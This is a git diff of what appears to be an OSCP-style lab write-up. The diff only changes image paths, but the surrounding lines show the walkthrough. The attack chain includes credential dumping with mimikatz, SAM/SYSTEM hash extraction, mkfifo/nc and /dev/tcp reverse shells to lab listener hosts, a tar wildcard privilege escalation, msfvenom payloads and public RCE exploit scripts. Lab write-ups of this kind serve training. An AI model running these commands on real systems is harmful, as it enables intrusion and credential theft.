@@ -162,7 +162,7 @@ oscp\eric.wallows@MS01 C:\Users\eric.wallows>
 
 After brute force the website 8000 , found the backup database `http://192.168.132.153:8000/Partner/Db` , and got the something like the password hashed
 
-![Pasted image 20251229204417.png](Pasted%20image%2020251229204417.png)
+![Pasted image 20251229204417.png](/ob/Pasted%20image%2020251229204417.png)
 
 Used the decoded password of  `Freedom1` to login by ssh , and the username can be also found in the backup database
 
@@ -176,7 +176,7 @@ Freedom1
 
 After login , found the .exe `admintool.exe` which is likely directly to execute the admin command by support ,but it require to the password , if the password is falied , it will show the hash? ,so i checked the hash , and i think it will be the password of `December31`
 
-![Pasted image 20251229205840.png](Pasted%20image%2020251229205840.png)
+![Pasted image 20251229205840.png](/ob/Pasted%20image%2020251229205840.png)
 
 ```
 support@MS01 C:\Users\support>.\admintool.exe whoami    
@@ -189,7 +189,7 @@ note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
 
 ```
 
-![Pasted image 20251229205926.png](Pasted%20image%2020251229205926.png)
+![Pasted image 20251229205926.png](/ob/Pasted%20image%2020251229205926.png)
 
 Login by `administrator` : `December31` by ssh , now have the highest privilege in the MS01 , so will do the lateral Movement to infect the MS01 , and used the mimikatz\[https://github.com/ParrotSec/mimikatz]  `sekurlsa::logonpasswords` to have the MS01 admin hash which can also found the https://crackstation.net/ to know the password is December31
 
@@ -199,9 +199,9 @@ ssh administrator@192.168.132.153
 December31
 ```
 
-![Pasted image 20251229211609.png](Pasted%20image%2020251229211609.png)
+![Pasted image 20251229211609.png](/ob/Pasted%20image%2020251229211609.png)
 
-![Pasted image 20251229211549.png](Pasted%20image%2020251229211549.png)
+![Pasted image 20251229211549.png](/ob/Pasted%20image%2020251229211549.png)
 
 ### MS01 sensitive data PS History File leak
 
@@ -209,7 +209,7 @@ December31
 
 After know the cred `Administrator : December31` ,we use the smb to test the DC01 , and found the  10.10.92.152 can be login
 
-![Pasted image 20251229213326.png](Pasted%20image%2020251229213326.png)
+![Pasted image 20251229213326.png](/ob/Pasted%20image%2020251229213326.png)
 
 Nmap reveal that they opened the 5985 , so login by `evil-winrm`, although we are the administrator in the DC01 , so next we need to find the way yo MS01
 
@@ -248,9 +248,9 @@ Nmap done: 1 IP address (1 host up) scanned in 199.34 seconds
 
 The history file of the `ConsoleHost_history.txt` can be found the password of `hghgib6vHT3bVWF`
 
-![Pasted image 20251229233322.png](Pasted%20image%2020251229233322.png)
+![Pasted image 20251229233322.png](/ob/Pasted%20image%2020251229233322.png)
 
-![Pasted image 20251229235732.png](Pasted%20image%2020251229235732.png)
+![Pasted image 20251229235732.png](/ob/Pasted%20image%2020251229235732.png)
 
 ### MS02 Administrator to tom\_admin (backup file windows.old sensitive data)
 
@@ -258,14 +258,14 @@ The history file of the `ConsoleHost_history.txt` can be found the password of `
 
 Via the evil-winrm to know we are administrator in MS02
 
-![Pasted image 20251230000128.png](Pasted%20image%2020251230000128.png)
+![Pasted image 20251230000128.png](/ob/Pasted%20image%2020251230000128.png)
 
 In the Windows old folder , Found the SAM and SYSTEM file can be used to tom\_admin hash\
-![Pasted image 20251230003228.png](Pasted%20image%2020251230003228.png)
+![Pasted image 20251230003228.png](/ob/Pasted%20image%2020251230003228.png)
 
-![Pasted image 20251230003747.png](Pasted%20image%2020251230003747.png)
+![Pasted image 20251230003747.png](/ob/Pasted%20image%2020251230003747.png)
 
-![Pasted image 20251230004208.png](Pasted%20image%2020251230004208.png)
+![Pasted image 20251230004208.png](/ob/Pasted%20image%2020251230004208.png)
 
 # Box Info 192.168.X.156
 
@@ -677,7 +677,7 @@ Try to login the database of phpadmin by `jack`: `3PUKsX98BMupBiCf`, but failed
 301      GET        7l       20w      259c http://192.168.151.156/phpmyadmin/doc/html/_images => http://192.168.151.156/phpmyadmin/doc/html/**_image**
 ```
 
-![Pasted image 20260102134004.png](Pasted%20image%2020260102134004.png)
+![Pasted image 20260102134004.png](/ob/Pasted%20image%2020260102134004.png)
 
 ***
 
@@ -685,7 +685,7 @@ Try to login the database of phpadmin by `jack`: `3PUKsX98BMupBiCf`, but failed
 
 The web 8080 is seem like the nginx proxy 80 proxy ,
 
-![Pasted image 20260102134158.png](Pasted%20image%2020260102134158.png)
+![Pasted image 20260102134158.png](/ob/Pasted%20image%2020260102134158.png)
 
 ***
 
@@ -699,14 +699,14 @@ The web 8080 is seem like the nginx proxy 80 proxy ,
 
 login as by jack : 3PUKsX98BMupBiCf
 
-![Pasted image 20260102134916.png](Pasted%20image%2020260102134916.png)\
-![Pasted image 20260102135052.png](Pasted%20image%2020260102135052.png)
+![Pasted image 20260102134916.png](/ob/Pasted%20image%2020260102134916.png)\
+![Pasted image 20260102135052.png](/ob/Pasted%20image%2020260102135052.png)
 
 next we need to find the rce to arrived the server
 
 in here , i use the link of https://github.com/CSpanias/vesta-rce-exploit
 
-![Pasted image 20260102140352.png](Pasted%20image%2020260102140352.png)
+![Pasted image 20260102140352.png](/ob/Pasted%20image%2020260102140352.png)
 
 ```
 └─# uv add --script vesta-rce-exploit.py requests
@@ -737,10 +737,10 @@ jack 3PUKsX98BMupBiCf
 
 ```
 
-![Pasted image 20260102140523.png](Pasted%20image%2020260102140523.png)\
+![Pasted image 20260102140523.png](/ob/Pasted%20image%2020260102140523.png)\
 now we do the python upgrade to get the flag
 
-![Pasted image 20260102140858.png](Pasted%20image%2020260102140858.png)
+![Pasted image 20260102140858.png](/ob/Pasted%20image%2020260102140858.png)
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.203 8080 >/tmp/f
@@ -873,7 +873,7 @@ Using binary mode to transfer files.
 ftp> ls
 ```
 
-![Pasted image 20260102142044.png](Pasted%20image%2020260102142044.png)
+![Pasted image 20260102142044.png](/ob/Pasted%20image%2020260102142044.png)
 
 ### PDF Check
 
@@ -1021,7 +1021,7 @@ robert
 
 we can login in by cassie:cassie
 
-![Pasted image 20260102142604.png](Pasted%20image%2020260102142604.png)
+![Pasted image 20260102142604.png](/ob/Pasted%20image%2020260102142604.png)
 
 That script of CVE can be tested to user enum , can add the name in the wordlist to test ;otherwise,  the website will block you
 
@@ -1088,7 +1088,7 @@ Possible user found with username: ftp
 Possible user found with username: cassie
 ```
 
-![Pasted image 20260102161040.png](Pasted%20image%2020260102161040.png)
+![Pasted image 20260102161040.png](/ob/Pasted%20image%2020260102161040.png)
 
 And then , use it  script to direct to do the  RCE\
 https://github.com/tunahantekeoglu/userminrce/blob/main/exploit.py
@@ -1110,7 +1110,7 @@ sh-5.1$ ls
 └─# uv run exploit.py  --host 192.168.151.157 --login cassie  --password cassie --lhost 192.168.45.203  --lport 80
 ```
 
-![Pasted image 20260102161618.png](Pasted%20image%2020260102161618.png)
+![Pasted image 20260102161618.png](/ob/Pasted%20image%2020260102161618.png)
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.203 21 >/tmp/f
@@ -1130,7 +1130,7 @@ cron show something should not by here
 ls -al /etc/cron*
 ```
 
-![Pasted image 20260105165811.png](Pasted%20image%2020260105165811.png)
+![Pasted image 20260105165811.png](/ob/Pasted%20image%2020260105165811.png)
 
 \`\`
 
@@ -1150,7 +1150,7 @@ cassie@oscp:/usr/share/usermin/gnupg/$
 
 * Check the execution status of "2 minutes" using the command `ls -al /etc/cron*`, which is executed by the root user every 2 minutes.
 
-![Pasted image 20260105213814.png](Pasted%20image%2020260105213814.png)
+![Pasted image 20260105213814.png](/ob/Pasted%20image%2020260105213814.png)
 
 ```
 cat /etc/cron.d/2minutes
@@ -1158,9 +1158,9 @@ cat /etc/cron.d/2minutes
 
 This `2minutes` shows that it will use the `tar` command to decompress files from the `/opt/admin` directory, which is also managed by our user. Furthermore, the `tar -xzf filename *` command is an important privilege escalation hint, as we can use the `*` command to obtain any archive. Therefore, we will use `touch ./--checkpoint=1 `,`touch ./--checkpoint-action=exec=sh\ shell.sh`,`echo "bash -i >& /dev/tcp/192.168.45.186/20000 0>&1" > shell.sh` to obtain a shell in `/opt/admin`.
 
-![Pasted image 20260105214154.png](Pasted%20image%2020260105214154.png)
+![Pasted image 20260105214154.png](/ob/Pasted%20image%2020260105214154.png)
 
-![Pasted image 20260105214251.png](Pasted%20image%2020260105214251.png)
+![Pasted image 20260105214251.png](/ob/Pasted%20image%2020260105214251.png)
 
 ```
 nc -lvnp 20000  
@@ -1276,11 +1276,11 @@ Nmap done: 1 IP address (1 host up) scanned in 2.86 seconds
 
 ### Web Recon 80
 
-![Pasted image 20260106155231.png](Pasted%20image%2020260106155231.png)
+![Pasted image 20260106155231.png](/ob/Pasted%20image%2020260106155231.png)
 
 ### Web Recon   9099
 
-![Pasted image 20260106155152.png](Pasted%20image%2020260106155152.png)
+![Pasted image 20260106155152.png](/ob/Pasted%20image%2020260106155152.png)
 
 ### WebSite Directory BurteForce
 
@@ -1319,7 +1319,7 @@ whatweb http://192.168.126.155:9099/
 		http://192.168.126.155:9099/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Mobile Mouse Server], IP[192.168.126.155], Title[Success!]                                                                                                                                          
 ```
 
-![Pasted image 20260106155347.png](Pasted%20image%2020260106155347.png)
+![Pasted image 20260106155347.png](/ob/Pasted%20image%2020260106155347.png)
 
 ```
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.202 LPORT=80 -f exe -o reverse.exe
@@ -1406,7 +1406,7 @@ s.close()
 uv run exploit.py --target 192.168.126.155  --file   ./rev80.exe --lhost 192.168.45.202 
 ```
 
-![Pasted image 20260106163407.png](Pasted%20image%2020260106163407.png)
+![Pasted image 20260106163407.png](/ob/Pasted%20image%2020260106163407.png)
 
 ### Tom to Admin (GPGService.exe Local Privilege Escalation)
 
@@ -1462,7 +1462,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.244 LPORT=35913 -f ex
 upload the admin.exe to /promgramdata
 ```
 
-![Pasted image 20260107153504.png](Pasted%20image%2020260107153504.png)
+![Pasted image 20260107153504.png](/ob/Pasted%20image%2020260107153504.png)
 
 replace the GPGService.exe by you admin.exe
 
@@ -1477,7 +1477,7 @@ Yes
 ```
 
 check the file size to ensure the admin is successfully to replace the GPGService.exe\
-![Pasted image 20260107153556.png](Pasted%20image%2020260107153556.png)
+![Pasted image 20260107153556.png](/ob/Pasted%20image%2020260107153556.png)
 
 start the service to active the admin.exe(GPGService.exe) to connect the msfconsole
 
@@ -1495,7 +1495,7 @@ SERVICE_NAME: GPGOrchestrator
 
 ```
 
-![Pasted image 20260107153621.png](Pasted%20image%2020260107153621.png)
+![Pasted image 20260107153621.png](/ob/Pasted%20image%2020260107153621.png)
 
 ```
 C:\Programdata>sc start GPGOrchestrator
@@ -1505,7 +1505,7 @@ sc start GPGOrchestrator
 The service did not respond to the start or control request in a timely fashion.
 ```
 
-![Pasted image 20260107153737.png](Pasted%20image%2020260107153737.png)
+![Pasted image 20260107153737.png](/ob/Pasted%20image%2020260107153737.png)
 
 ```
 └─# sudo msfconsole
@@ -1523,4 +1523,4 @@ msf exploit(multi/handler) exploit
 
 DONEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE>,<
 
-![Pasted image 20260107152839.png](Pasted%20image%2020260107152839.png)
+![Pasted image 20260107152839.png](/ob/Pasted%20image%2020260107152839.png)
